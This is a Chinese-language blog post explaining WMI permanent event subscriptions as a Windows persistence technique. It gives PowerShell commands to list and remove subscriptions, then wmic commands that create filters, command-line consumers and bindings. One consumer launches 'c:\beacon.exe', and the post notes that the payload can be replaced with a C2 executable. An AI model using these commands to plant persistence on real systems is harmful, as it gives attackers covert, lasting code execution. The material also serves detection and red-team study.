---
title: Persistence WMI
date: 2023-09-14T16:39:21+08:00
draft: false
url: /posts/2023-09-14/WMI
tags:
  - WMI
  - Windows
  - Persistence
---

## 0x00 前言

Persistence WMI

## 0x01 WMI

### 查询事件

#### 列出事件过滤器

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
```

#### 列出事件消费者

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
```

#### 列出事件绑定

```powershell
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

### 删除事件

#### 删除事件过滤器

```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='事件过滤器名'" | Remove-WmiObject -Verbose
```

#### 删除事件消费者

```powershell
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='事件消费者名'" | Remove-WmiObject -Verbose
```

#### 删除事件绑定

```powershell
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%事件绑定名%'" | Remove-WmiObject -Verbose
```

## 0x02 利用原理

### WMI永久事件

注意：没有指定时间轮询则需要机器重启才可以进行WMI轮询，需要注意的一点是，WMI可以任意指定触发条件，例如用户退出，某个程序创建，结束等等。

注意：可以考虑添加Powershell的时间间隔器，需要上线至C2则将Payload替换成C2的exe或者dll或者ps1即可

#### 注册一个 WMI 事件过滤器

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __TimerEvent WITHIN 10 WHERE TimerID = 'BugSecFilter'"
```

#### 注册一个 WMI 事件消费者

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c  c:\beacon.exe"
```

#### 将事件消费者绑定到事件过滤器

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
```

```bat
:: Based on http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html

:: the following command are meant for cmd but can be used with wmic.exe by simply writing them without the wmic at the start.

:: Create an __EventFilter instance.
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BugSecFilter", EventNamespace = "root\cimv2", QueryLanguage="WQL", Query="select * from __InstanceCreationEvent within 5 where targetInstance isa 'Win32_Process' and TargetInstance.Name = 'chrome.exe'"

:: Create an __EventConsumer instance
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BugSecConsumer", CommandLineTemplate="cmd.exe /c echo test > c:\WMI-wmic.txt"

:: Create a __FilterToConsumerBinding instance
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
```

### 定时执行

#### Step 1

- `/NAMESPACE:"\\root\subscription"`: 指定 WMI 命名空间为 "\root\subscription"，这是用于访问事件订阅相关信息的命名空间
- `PATH __EventFilter CREATE`: 创建一个名为 "__EventFilter" 的对象，该对象是事件筛选器
- `Name="BotFilter82"`: 设置筛选器的名称为 "BotFilter82"
- `EventNameSpace="root\cimv2"`: 设置事件名称空间为 "root\cimv2"，表示在此名称空间中查询事件
- `QueryLanguage="WQL"`: 设定查询语言为 WQL (Windows Query Language)
- `Query="SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`: 设置查询语句，该语句使用了 "__InstanceModificationEvent" 类来监视某个时间段内（120秒） "Win32_PerfFormattedData_PerfOS_System" 类型的实例修改事件

```cmd
# Usage
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="筛选器的名称"
, EventNameSpace="事件名称空间",QueryLanguage="WQL", Query="SELECT * FROM __Instance
ModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82"
, EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __Instance
ModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

#### Step 2

```cmd
# Usage
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="消费者的名称", ExecutablePath="可执行文件路径",CommandLineTemplate="命令行参数模板"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="B
otConsumer23", ExecutablePath="C:\Windows\System32\notepad.exe",CommandLineTemplate="C:\Windows\System32\notepad.exe"
```

- `/NAMESPACE:"\\root\subscription"`: 指定 WMI 命名空间为 "\root\subscription"
- `PATH CommandLineEventConsumer CREATE`: 创建一个名为 "CommandLineEventConsumer" 的对象，该对象是命令行事件消费者
- `Name="BotConsumer23"`: 设置消费者的名称为 "BotConsumer23"
- `ExecutablePath="C:\Windows\System32\notepad.exe"`: 指定可执行文件路径为 "C:\Windows\System32\notepad.exe"
- `CommandLineTemplate="C:\Windows\System32\notepad.exe"`: 指定命令行参数模板为 "C:\Windows\System32\notepad.exe"

#### Step 3

```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter
="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"B
otConsumer23\""
```
